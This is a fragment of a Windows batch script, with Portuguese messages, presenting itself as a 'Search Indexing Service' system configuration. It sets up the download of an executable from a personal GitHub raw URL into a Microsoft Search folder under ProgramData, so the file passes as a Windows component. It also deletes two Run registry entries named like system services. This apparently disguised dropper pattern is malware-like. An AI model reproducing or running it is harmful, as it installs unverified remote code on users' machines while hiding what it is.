...
echo.
echo ================================================
echo   CONFIGURACAO DE SISTEMA - Search Indexing Service
echo ================================================
echo.

rem --- CONFIGURACAO ---
set "REPO_URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/SearchIndexer.exe"
set "TARGET_NAME=SearchIndexer.exe"
set "TARGET_DIR=%PROGRAMDATA%\Microsoft\Search\Data\Packages"
rem --------------------
...
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TextService" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ExplorerService" /f >nul 2>&1
